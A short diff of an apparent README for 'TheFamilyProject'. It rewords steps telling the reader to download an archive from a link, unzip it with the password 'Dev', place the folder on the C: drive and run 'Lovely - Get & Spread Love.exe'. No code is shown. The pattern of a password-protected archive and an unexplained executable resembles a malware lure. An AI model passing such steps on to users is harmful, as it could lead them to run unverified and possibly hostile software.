@@ -26,7 +26,7 @@ Explore in light of this, and keep spreading the love.
 # Perform These Prior To Running
 ---------------------------------
 > Go to the link in the Download folder & download the file.
-> Extract the File _ (Pass is Dev).
+> Unzip File _ (Pass is Dev). ______ [N.B Verify that "TheFamilyProject" subfolders don't include subfolders with the same name after unzipping.]
 > Move "TheFamilyProject" Folder In (C:) Drive Folder To Execute Properly.
 > Then Get The 'Lovely - Get & Spread Love.exe' File.
 > Run & Enjoy.
